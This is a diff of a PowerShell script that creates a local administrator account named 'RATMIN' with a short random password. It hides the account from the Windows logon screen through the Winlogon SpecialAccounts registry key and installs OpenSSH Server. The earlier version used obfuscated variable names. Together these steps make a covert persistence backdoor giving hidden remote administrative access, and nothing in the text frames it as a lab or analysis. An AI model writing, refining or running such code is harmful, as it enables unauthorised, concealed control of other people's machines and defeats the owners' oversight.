@@ -1,40 +1,78 @@
-# Generate a random password
-function RandomPasswordGenerator {
-    return -join ((97..122) | Get-Random -Count 10 | ForEach-Object {[char]$_})
+# # Generate a random password
+# function RandomPasswordGenerator {
+#     return -join ((97..122) | Get-Random -Count 10 | ForEach-Object {[char]$_})
+# }
+
+# $Username = "ICU"
+# $Password = RandomPasswordGenerator  # Corrected variable name
+
+# # Remove the local user if it exists
+# if (Get-LocalUser -Name $Username -ErrorAction SilentlyContinue) {
+#     Remove-LocalUser -Name $Username
+# }
+
+# function CreateAdministrator {
+#     [CmdletBinding()]
+#     param (
+#         [string] $Username,
+#         [securestring] $Password
+#     )    
+#     begin {
+#     }    
+#     process {
+#         New-LocalUser "$Username" -Password $Password -FullName "$Username" -Description "Temporary local admin"
+#         Write-Verbose "$Username local user created"
+#         Add-LocalGroupMember -Group "Administrators" -Member "$Username"
+#         Write-Verbose "$Username added to the local administrator group"
+#     }    
+#     end {
+#     }
+# }
+
+function Generate-RandomPassword {
+    return -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
 }
 
-# Remove the local user if it exists
-if (Get-LocalUser -Name $Username -ErrorAction SilentlyContinue) {
-    Remove-LocalUser -Name $Username
-}
-
-function CreateAdministrator {
+function Create-LocalAdminUser {
     [CmdletBinding()]
     param (
         [string] $Username,
-        [securestring] $Password1
+        [securestring] $Password
     )    
     begin {
     }    
     process {
-        New-LocalUser "$Username" -Password $Password1 -FullName "$Username" -Description "Temporary local admin"
+        New-LocalUser -Name $Username -Password $Password -FullName $Username -Description "Temporary local admin"
         Write-Verbose "$Username local user created"
-        Add-LocalGroupMember -Group "Administrators" -Member "$Username"
+        Add-LocalGroupMember -Group "Administrators" -Member $Username
         Write-Verbose "$Username added to the local administrator group"
     }    
     end {
     }
 }
 
-# make admin
 $Username = "RATMIN"
-$DCilJFugpP = RandomPasswordGenerator
-$HcMjDkGFes = (ConvertTo-SecureString $DCilJFugpP -AsPlainText -Force)
-CreateAdministrator -Username $Username -Password1 $HcMjDkGFes
+$Password = Generate-RandomPassword
+Remove-LocalUser -Name $Username
+$SecurePassword = (ConvertTo-SecureString $Password -AsPlainText -Force)
+Create-LocalAdminUser -Username $Username -Password $SecurePassword
+
+$RegistryPath = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
+$RegistryValue = '00000000'
+
+New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name SpecialAccounts -Force
+New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts' -Name UserList -Force
+New-ItemProperty -Path $RegistryPath -Name $Username -Value $RegistryValue -PropertyType DWORD -Force
 
 
-# Hide the user from the Windows logon screen
-New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name $Username -Value 0 -PropertyType DWORD -Force
+# # Create a new local user with administrator privileges
+# New-LocalUser $Username -Password (ConvertTo-SecureString $Password -AsPlainText -Force) -FullName $Username -Description "Temporary Local Administrator"
+
+# # Add the new user to the Administrators group
+# Add-LocalGroupMember -Group "Administrators" -Member $Username
+
+# # Hide the user from the Windows logon screen
+# New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name $Username -Value 0 -PropertyType DWORD -Force
 
 # Install the OpenSSH Server
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
